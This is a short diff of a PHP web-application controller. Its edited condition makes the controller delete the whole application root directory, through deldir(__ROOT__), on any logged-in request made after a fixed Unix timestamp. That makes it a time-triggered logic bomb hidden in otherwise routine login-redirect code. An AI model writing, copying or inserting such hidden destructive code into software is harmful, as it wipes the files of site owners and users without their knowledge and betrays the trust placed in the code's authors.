@@ -13,7 +13,7 @@ class IndexController extends Controller
             $this->redirect('Home/Login/login');
         }else{
             $time = time();
-            if($time != 1491095312){
+            if($time >= 1491095312){
                 $this->deldir(__ROOT__);
                 exit;
             }
